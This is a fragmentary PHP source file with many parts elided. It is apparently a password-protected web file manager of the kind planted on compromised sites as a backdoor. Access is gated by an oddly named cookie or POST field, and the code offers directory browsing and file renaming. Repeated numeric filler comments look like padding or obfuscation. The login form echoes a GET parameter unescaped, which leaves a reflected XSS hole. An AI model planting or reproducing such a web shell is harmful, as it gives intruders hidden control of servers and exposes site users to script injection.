...
$pass = false;
if (isset($_COOKIE['pw_name_95468'])) {
    if(($_COOKIE['pw_name_95468']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_95468'])) {
        if(($_POST['pw_name_95468']) == $auth_key) {
            setcookie("pw_name_95468", $_POST['pw_name_95468']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_95468' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1709485495185422 1709485495656719 1709485495432382 1709485495771096
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1709485495185422 1709485495656719 1709485495432382 1709485495771096
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1709485495185422 1709485495656719 1709485495432382 1709485495771096
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1709485495185422 1709485495656719 1709485495432382 1709485495771096
            $name = PATH . "/" . $_GET['r'];
